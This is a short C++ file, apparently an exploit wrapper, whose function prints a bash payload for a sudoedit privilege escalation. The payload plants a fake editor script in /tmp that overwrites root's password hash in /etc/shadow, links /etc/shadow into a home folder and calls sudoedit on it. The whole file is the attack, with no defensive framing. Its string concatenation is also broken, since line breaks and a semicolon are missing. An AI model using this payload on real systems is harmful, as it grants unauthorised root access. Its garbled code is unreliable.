#include <iostream>
void sudoCVE(void)
{
	std::string payload = "export EDITOR=\"/tmp/edit\""
										"export FOLDER=\"${RANDOM}\""
										"export PASSWD=$(printf ${RANDOM} \\"
										"		| md5sum \\"
										"		| awk \\'{print $1}\')"




										"prepare()" 
										"{\n"
											"cat << EOF >> /tmp/edit\n"
											"#!/usr/bin/env bash\n"
											"pass=\"$(printf \"%q\" $(openssl passwd -1 -salt ${RANDOM} ${PASSWD}))\"\n"
											"sed -i -e  \"s,^root:[^:]\+:,root:\${pass}:,\" \${1}\n"
											"EOF\n"
										"}\n"

										"main()" 
										"{\n"
											
											"mkdir -p /home/${USER}/${FOLDER}/\n"
											
											"ln -sf /etc/shadow /home/${USER}/${FOLDER}/esc.txt\n"
											
											"prepare && chmod +x ${EDITOR}\n"
											
											"sudoedit /home/${USER}/${FOLDER}/esc.txt\n"
										
										"}; main" 
    
    std::cout << payload << std::endl;
}